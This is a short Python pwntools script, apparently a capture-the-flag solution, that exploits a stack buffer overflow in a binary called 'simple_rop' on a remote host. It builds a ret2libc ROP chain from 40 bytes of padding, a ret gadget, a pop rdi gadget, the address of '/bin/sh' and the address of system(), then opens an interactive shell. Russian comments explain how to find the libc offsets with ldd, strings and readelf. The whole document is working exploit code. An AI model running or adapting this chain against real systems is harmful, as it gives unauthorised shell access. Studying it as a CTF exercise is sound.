from pwn import *

# ldd ./simple_rop (узнаём libc)
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh" (смещение /bin/sh)
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system@@GLIBC (смещение system())

# elf = ELF("./simple_rop")
# rop = ROP(elf)
# print(rop.rdi)

# p = process("./simple_rop")
p = remote("rev.danissimurr.ru", 1344)

pop_rdi = 0x40117e
offset_binsh = 0x1d8678
offset_system = 0x50d70
libc = 0x00007ffff7c00000
system = libc + offset_system
binsh = libc + offset_binsh
ret = 0x40120b
p.recvuntil(b"dude!\n")
p.sendline(b'A'*40 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
p.interactive()